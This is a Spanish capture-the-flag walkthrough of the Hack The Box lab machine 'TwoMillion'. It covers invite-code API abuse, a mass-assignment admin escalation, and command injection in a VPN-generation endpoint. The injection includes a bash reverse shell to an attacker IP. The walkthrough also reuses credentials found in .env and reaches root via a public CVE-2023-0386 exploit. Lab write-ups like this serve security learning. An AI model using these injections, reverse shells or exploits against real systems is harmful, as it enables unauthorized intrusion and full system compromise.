****
- Tags: #javascript #decrypt #API #Kernel
****
Vamos a resolver la máquina TwoMillion. 
- Categoría: Fácil
- Sistema: Linux
- IP: `10.10.11.221`

### 1. Enumeración

Realizamos un primer escaneo con [[nmap]] al host. Descubrimos que tiene los puertos 22 ([[SSH - Secure Shell]]) y 80 abiertos. Con una enumeración de la versión de dichos puertos, obtenemos lo siguiente:

```
   1   │ # Nmap 7.95 scan initiated Sat Apr 12 16:31:51 2025 as: /usr/lib/nmap/nmap --privileged -p22
   2   │ Nmap scan report for 10.10.11.221
   3   │ Host is up (0.037s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
   9   │ |_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
  10   │ 80/tcp open  http    nginx
  11   │ |_http-title: Did not follow redirect to http://2million.htb/
  12   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  13   │ 
  14   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/
  15   │ # Nmap done at Sat Apr 12 16:31:59 2025 -- 1 IP address (1 host up) scanned in 8.14 seconds
```

Vemos que nos lleva a la dirección `http://2million.htb/`, por lo que lo añadimos en el archivo `/etc/hosts`. 

```/etc/hosts
10.10.11.221    2million.htb
```

El siguiente paso será enumerar directorios de la página web. Para ello, usaremos la herramienta `dirbuster` abriéndola en segundo plano con las opciones `dirbuster &> /dev/null & disown`. Tras un rato, descubrimos que existe el directorio `/invite`, así que accedemos e investigamos. Al navegar a esta página, vemos el código javascript de la misma. Si nos fijamos bien, se presenta un enlace a este script: `/js/inviteapi.min.js`. Al ir a ese script, vemos que está ofuscado:

```javascript
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

Lo defuscamos para ver mejor qué está sucediendo, con la herramienta [de4js](https://lelinhtinh.github.io/de4js/). Al investigar un poco mejor, vemos que tiene dos funciones, pero nos interesa la última:

```javascript
function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    });
}
```

Vemos que la función `makeInviteCode()` se encarga de crear un código de invitación mediante POST, así que usando BurpSuite, capturamos la sesión. Para ello, seguimos estos pasos:
1. Iniciamos BurpSuite y activamos el Proxy
2. Usamos FoxyProxy para capturar peticiones
3. Abrimos la consola del navegador y escribimos `makeInviteCode()`
4. Desde BurpSuite enviamos al Repeater con `Ctrl+R` la llamada
5. La enviamos desde aquí con Send

![[TwoMillion_1.png| 1200]]

Ya nos está diciendo la propia llamada que tenemos un cifrado ROT13, así que lo desciframos. Primero metemos toda esa secuencia en un archivo y hacemos esto:

```bash
cat data_rot13 | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

La secuencia desencriptada dice lo siguiente: `In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate`. Pues aprovechando que estamos en BurpSuite, modificamos la URL de la llamada POST para obtener el código de invitación:

![[TwoMillion_2.png| 1200]]

Ahora que ya tenemos el código de invitación válido, lo introducimos en la página de registro (Encontrada gracias a dirbuster, en la ruta `/register`). En esta página, vemos que el textbox de código de invitación está en modo readonly, pero si simplemente lo eliminamos desde la consola del navegador ya podremos escribir. Ojo, es importante aclarar que el código válido debe estar decodificado, pues por defecto, nos lo da en Base64. Lo bueno es que BurpSuite ya nos lo decodifica al seleccionarlo, así que simplemente introducimos el código decodificado, que es `9R2L8-NN81J-TA002-PR20H`.

Con esto, estamos dentro de la web habiéndonos registrado correctamente con el código de invitación. Tras navegar un poco, vemos que no funciona casi nada, a excepción de un botón de descarga, en el que dice `Connection Pack` dentro de la URL `/home/access`. Lo capturamos con BurpSuite para investigar más a fondo qué hace esto. 

![[TwoMillion_4.png| 1000]]

No nos sirve de mucho. Ya que la web trabaja con múltiples endpoints API, vamos a ver si conseguimos listarlos todos. De primeras, hacemos un curl contra la ruta raíz (`/api`). 

```bash
❯ curl -v "http://2million.htb/api/v1"
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
* using HTTP/1.x
> GET /api/v1 HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.13.0-rc3
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< Server: nginx
< Date: Sat, 12 Apr 2025 15:48:28 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=k7092n72tm9e1gj4vkn18fg9cc; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb left intact
```

Nos da un 401, que significa no autorizado. Como estamos logueados, podemos aplicarle a curl la cookie de nuestra sesión: (Para obtenerla, desde el navegador -> herramientas -> almacenamiento -> cookies).

```bash
❯ curl -v "http://2million.htb/api/v1" -b "PHPSESSID=36ugo7rihvpr97shtmkuhe05g0"
{...}
* Connection #0 to host 2million.htb left intact
{"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":"Verify invite code","\/api\/v1\/user\/auth":"Check if user is authenticated","\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration","\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration","\/api\/v1\/user\/vpn\/download":"Download OVPN file"},"POST":{"\/api\/v1\/user\/register":"Register a new user","\/api\/v1\/user\/login":"Login with existing user"}},"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}}}%     
```
 
 Vemos que obtenemos todos los endpoints. Vamos a aplicar un pipe jq para verlo más bonito:

```JSON
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Y ojito, que tenemos endpoints para el admin. Bueno, el único por GET simplemente nos checkea si somos o no admin, y si lo lanzamos nos devuelve `false`. Pero hay una llamada POST que genera un vpn para el administrador. Vamos a lanzarla:

```bash
curl -sv -X POST "http://2million.htb/api/v1/admin/vpn/generate" -b "PHPSESSID=36ugo7rihvpr97shtmkuhe05g0" | jq
```

Pero nos tira un 401. No podemos generar un vpn de admin tan fácilmente. Así que vamos a probar con la llamada PUT. Desde Postman todo esto sería mucho más sencillo, pero así practicamos desde terminal. De primeras:

```bash
❯ curl -sv -X PUT "http://2million.htb/api/v1/admin/settings/update" -b "PHPSESSID=36ugo7rihvpr97shtmkuhe05g0" | jq
{...}
{
  "status": "danger",
  "message": "Invalid content type."
}
```

Al menos nos da un 200. Vamos a incluir información para ser administradores. Tendremos que incluir el parámetro `--header "Content-Type: application/json"`, y nos devuelve esto:

```JSON
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

Pues ya sabemos que necesitamos el campo de email. Vamos a incluirlo con `--data`. 

```bash
curl -sv -X PUT "http://2million.htb/api/v1/admin/settings/update" \
  -b "PHPSESSID=36ugo7rihvpr97shtmkuhe05g0" \
  -H "Content-Type: application/json" \
  --data '{"email":"alejo@test.com"}' | jq
```

Estamos incluyendo nuestro email, con el que nos registramos. Nos dice que falta el parámetro `is_admin`, así que hacemos lo mismo:

```bash
curl -sv -X PUT "http://2million.htb/api/v1/admin/settings/update" \
  -b "PHPSESSID=36ugo7rihvpr97shtmkuhe05g0" \
  -H "Content-Type: application/json" \
  --data '{"email":"alejo@test.com", "is_admin":true}' | jq

# Response

{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```

Nos va a decir que debe ser 0 o 1, y no true. Pues hacemos eso. ¡Por fin somos administradores!

```JSON
{
  "id": 13,
  "username": "alejo",
  "is_admin": 1
}
```

Lo comprobamos rápidamente con la llamada GET previa:

```bash
❯ curl -sv "http://2million.htb/api/v1/admin/auth" -b "PHPSESSID=36ugo7rihvpr97shtmkuhe05g0" | jq
{...}
{
  "message": true
}
```

### 2. Foothold

Bien, si recordamos los endpoints como admi, había uno del tipo POST que generaba un VPN para el admin. Si lo lanzamos nos dice esto:

```bash
❯ curl -sv -X POST "http://2million.htb/api/v1/admin/vpn/generate" -b "PHPSESSID=36ugo7rihvpr97shtmkuhe05g0" --header "Content-Type: application/json" | jq

# Response

{
  "status": "danger",
  "message": "Invalid parameter: username"
}
```

Pues igual que antes, metemos el campo necesario en el `--data`, quitamos el `jq` ya que la respuesta es un HTML. Vemos cosas muy interesantes, la más importante es que nos da una clave privada. 

```HTML
<key> 
-----BEGIN PRIVATE KEY----- 
.... 
-----END PRIVATE KEY----- 
</key>
```

Perfecto, ya tenemos la clave privada para conectarnos por SSH. Para ello, nos copiamos el contenido en un archivo `id_rsa`. Después le damos permisos `chmod 600`. Pero si intentamos conectarnos con `ssh -i id_rsa alejo@10.10.11.221`, no nos deja. Así que habrá que intentar otras formas de entrar en el sistema. Vamos a ver si podemos usar comandos de sistema con la llamada POST.

```bash
curl -sv -X POST "http://2million.htb/api/v1/admin/vpn/generate" \
  -b "PHPSESSID=36ugo7rihvpr97shtmkuhe05g0" \
  -H "Content-Type: application/json" \
  --data '{"username":"alejo;id;"}'
{...}
uid=33(www-data) gid=33(www-data) groups=33(www-data)
* Connection #0 to host 2million.htb left intact
```

Y ojito, porque acabamos de introducir el comando `id`. Pues vamos a establecernos una reverse shell (Para más información, [[Shells]]). 

```bash
❯ curl -sv -X POST "http://2million.htb/api/v1/admin/vpn/generate" \
  -b "PHPSESSID=36ugo7rihvpr97shtmkuhe05g0" \
  -H "Content-Type: application/json" \
  --data '{"username":"alejo;bash -c \"bash -i >& /dev/tcp/10.10.14.13/443 0>&1\";"}'
```

![[TwoMillion_5.png| 700]]

Ya estamos dentro. Nos vamos a `/home` Para obtener la flag del usuario. PERO NO NOS DEJA.

```bash
www-data@2million:/home/admin$ cat user.txt 
cat: user.txt: Permission denied
www-data@2million:/home/admin$ ls -l
total 4
-rw-r----- 1 root admin 33 Apr 12 14:30 user.txt
```

Vamos a probar con movimiento lateral. Volvemos a la ruta `/var/www/html` y listamos el archivo `.env`:

```bash
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Pues ya tenemos credenciales del administrador para conectarnos a la base de datos. Además, al listar el archivo `/etc/passwd`, vemos que el usuario admin existe. Pero vamos a hacer algo más, y es listar los puertos abiertos internamente a los que no tenemos acceso desde fuera. Primero, listamos el archivo `/proc/net/tcp`:

```bash
www-data@2million:~/html$ cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 25644 1 0000000000000000 100 0 0 10 0                     
   1: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 24712 1 0000000000000000 100 0 0 10 0                     
   2: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   102        0 21816 1 0000000000000000 100 0 0 10 5                     
   3: 0100007F:2BCB 00000000:0000 0A 00000000:00000000 00:00000000 00000000   115        0 24822 1 0000000000000000 100 0 0 10 0                     
   4: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   114        0 24851 1 0000000000000000 100 0 0 10 0                     
   5: 0100007F:A192 0100007F:0CEA 01 00000000:00000000 02:0009B61A 00000000    33        0 10981820 2 0000000000000000 20 4 26 10 -1                 
   6: 0100007F:0CEA 0100007F:A192 01 00000000:00000000 02:0009B61A 00000000   114        0 10981821 2 0000000000000000 20 4 29 10 -1                 
   7: 0100007F:C958 0100007F:2BCB 01 00000000:00000000 00:00000000 00000000    33        0 10981818 1 0000000000000000 20 4 30 10 -1                 
   8: DD0B0A0A:C448 0D0E0A0A:01BB 01 00000002:00000000 01:00000018 00000000    33        0 10981844 3 0000000000000000 24 15 31 10 -1                
   9: DD0B0A0A:B6E8 08080808:0035 02 00000001:00000000 01:000002B3 00000003   102        0 11015234 2 0000000000000000 800 0 0 1 7                   
  10: 0100007F:2BCB 0100007F:C958 01 00000000:00000000 02:0009B61A 00000000   115        0 10981819 2 0000000000000000 20 4 29 10 -1                 
www-data@2million:~/html$ 
```

Nos fijamos en el segundo parámetro, y creamos un archivo con esos valores. Ese segundo parámetro son los puertos abiertos. (Columna red_address). Ahora, creamos un script en bash para pasar de hexadecimal a decimal:

```bash
#!/bin/bash

while read -r hex; do
    # Elimina posibles espacios o saltos de línea
    hex_clean=$(echo "$hex" | tr -d '\r\n')
    # Convierte de hexadecimal a decimal
    decimal=$((16#$hex_clean))
    echo "[+] Para $hex_clean: Corresponde a puerto $decimal"
done < ports
```

Le damos permisos de ejecución y lo lanzamos (en la última línea, donde pone `done < ports` quiere decir que hemos llamado `ports` al archivo donde están los puertos obtenidos). Y vemos lo siguiente:

```bash
❯ ./script_hex.sh
[+] Para 0016: Corresponde a puerto 22
[+] Para 0050: Corresponde a puerto 80
[+] Para 0035: Corresponde a puerto 53
[+] Para 2BCB: Corresponde a puerto 11211
[+] Para 0CEA: Corresponde a puerto 3306
[+] Para A192: Corresponde a puerto 41362
[+] Para 0CEA: Corresponde a puerto 3306
[+] Para C958: Corresponde a puerto 51544
[+] Para C448: Corresponde a puerto 50248
[+] Para B6E8: Corresponde a puerto 46824
[+] Para 2BCB: Corresponde a puerto 11211
```

Está corriendo el puerto 3306, el de MySQL. Así que, aprovechando la reverse shell anterior, nos conectamos por MySQL:

![[TwoMillion_6.png]]

Si intentamos listar los usuarios disponibles, vemos que sus contraseñas están hasheadas:

![[TwoMillion_7.png| 900]]

Pero esto nos sirve para aprender sobre archivos de linux. Busquemos otra forma de acceder. Ya que tenemos las contraseñas de `.env`, probemos a entrar por SSH. Efectivamente, nos ha dejado. Ahora ya podemos obtener la flag del admin (que no es la de root).

### 3. Escalada de privilegios

Ahora a buscar cómo ser root del sistema. No podemos listar crontabs ni hacer un `sudo -l`. Si listamos archivos con permisos SUID con `find / -type f -perm -4000 2>/dev/null` tampoco vemos nada interesante. Vamos a ver si podemos hacer algún exploit a nivel de kernel. Para ello, vamos a ver el tipo de sistema que hay:

```bash
admin@2million:~$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

admin@2million:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 22.04.2 LTS
Release:	22.04
Codename:	jammy
```

Vemos que estamos ante un Linux Jammy con kernel versión `5.15.70`, y si hacemos una búsqueda rápida en Google, vemos que es vulnerable esta versión del kernel en Ubuntu Jammy al [CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386). Vamos a pasarnoslo a la máquina, al directorio `/tmp` mediante el comando `scp`. (Para más información, consultar [[Linux - Métodos de transferencia de archivos]]).

1. Nos clonamos el repositorio
2. Comprimimos la carpeta con `zip -r cve.zip CVE-2023-0386`
3. La copiamos a la máquina con `scp cve.zip admin@10.10.11.221:/tmp`

Con esto ya estará subido el archivo en `/tmp` de la máquina. Allí lo descomprimimos con `unzip` y pasamos a realizar el exploit, siguiendo los pasos de GitHub.

```bash
admin@2million:/tmp/cve/CVE-2023-0386$ make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘read_buf_callback’:
fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
  106 |     printf("offset %d\n", off);
      |                    ~^     ~~~
      |                     |     |
      |                     int   off_t {aka long int}
      |                    %ld
fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ {aka ‘long unsigned int’} [-Wformat=]
  107 |     printf("size %d\n", size);
      |                  ~^     ~~~~
      |                   |     |
      |                   int   size_t {aka long unsigned int}
      |                  %ld
fuse.c: In function ‘main’:
fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
  214 |     while (read(fd, content + clen, 1) > 0)
      |            ^~~~
      |            fread
fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
  216 |     close(fd);
      |     ^~~~~
      |     pclose
fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
  221 |     rmdir(mount_path);
      |     ^~~~~
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
```

Aunque de errores, no pasa nada, porque ha funcionado bien. Pasamos a correr el exploit según lo explicado en el repositorio donde estaba el exploit, pero poniendo el primer comando en segundo plano con `&`:

```bash
admin@2million:/tmp/cve/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc &
[1] 3498
admin@2million:/tmp/cve/CVE-2023-0386$ [+] len of gc: 0x3ee0
./exp
```

Ya somos root. 

```bash
root@2million:/tmp/cve/CVE-2023-0386# whoami
root
```

Obtenemos la flag de root y terminamos.

